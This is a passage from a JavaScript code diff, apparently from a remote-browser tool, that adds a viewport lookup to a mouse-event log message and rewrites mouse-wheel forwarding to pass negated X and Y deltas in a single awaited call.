-          console.log(`[MOUSE_EVENT] mobile mouseup => puppeteer(${Math.round(mouse_event.clientX)},${Math.round(mouse_event.clientY)}) viewport=${vp ? vp.width+'x'+vp.height : 'unknown'}`)
+          const vp = getPageViewport(browser.target_page)
+          console.log(`[MOUSE_EVENT] mobile mouseup => browser(${Math.round(mouse_event.clientX)},${Math.round(mouse_event.clientY)}) viewport=${vp ? vp.width+'x'+vp.height : 'unknown'}`)
         }
         try {
           const pointer = await getRemotePointerCoordinates(browser, mouse_event.clientX, mouse_event.clientY)
@@ -1337,8 +1378,9 @@ let ship_logs = null;
           if (mouse_event.type === "click") {
             await browser.target_page.mouse.move(pointerX, pointerY)
           } else if (mouse_event.type === "mousewheel") {
-            browser.target_page.mouse.wheel({ "deltaX": mouse_event.wheelDeltaX })
-            browser.target_page.mouse.wheel({ "deltaY": mouse_event.wheelDeltaY })
+            const deltaX = -(Number(mouse_event.wheelDeltaX) || 0)
+            const deltaY = -(Number(mouse_event.wheelDeltaY) || 0)
+            await browser.target_page.mouse.wheel(deltaX, deltaY)
           } else if (mouse_event.type === "mousedown") {
             await browser.target_page.mouse.move(pointerX, pointerY)
             await browser.target_page.mouse.down()
